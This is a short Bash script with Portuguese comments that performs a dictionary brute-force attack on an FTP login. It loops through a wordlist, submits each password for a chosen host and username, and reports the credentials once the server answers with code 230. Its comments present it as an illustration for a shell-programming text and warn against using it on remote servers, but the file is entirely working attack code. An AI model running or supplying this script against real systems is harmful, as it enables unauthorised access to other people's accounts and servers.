#!/bin/bash
#
##################################################################
# ***********
# * ATENÇÃO *
# ***********
# Não use este script para atacar servidores remotos! Ele deixará
# arquivos de log imensos! Use-o apenas em localhost (127.0.0.1)
# e veja você mesmo os rastros deixados nos arquivos de log.
##################################################################
#
# Este código é só pra ilustração do texto
# "Programação em Bourne-Agai Shell", OK?
# Na prática mesmo ele não é muito útil.
# Se quiser fazer um ataque de força bruta
# mais eficiente faça em C.
# Veja mais sobre ataques de força bruta em um
# texto que o NashLeon fez em
# <http://unsekurity.virtualave.net>
#

# verifica se o parâmetro passado é um arquivo
[ -f "$1" ] || {
	echo -e "\e[1mErro na passagem de parâmetros\e[m"
	echo "Uso: `basename $0` wordlist"
	exit 1
}

WL="$1"

echo -e " \e[36;1m
------------------------------- \e[37;1m
 ataque de força bruta via ftp \e[36;1m
------------------------------- \e[m
"
read -p "Host: " HOST
read -p "Username: " USER

cat $WL |
while read PASS
do
    # 230 é o número que recebemos quando entramos com sucesso via ftp
    ftp -ivn << EoF | grep "^230" &>/dev/null
open $HOST
user $USER $PASS
bye
EoF

    # $? contém o código de retorno do grep
    [ $? -eq 0 ] && {
	echo -e "\n\e[36;5;1mO ataque foi bem sucedido! \e[m"
	echo -e "Username: \e[1m$USER\e[m\nPassword: \e[1m$PASS\e[m"
	exit 0
	# lembrando que o exit funciona como se fosse break
}

done

# $? contém o mesmo valor não-zero que fez parar o loop acima
[ $? -ne 0 ] && echo "
Você entupiu os arquivos de log por nada, pois o ataque fracassou...
Mais sorte da próxima vez!
"
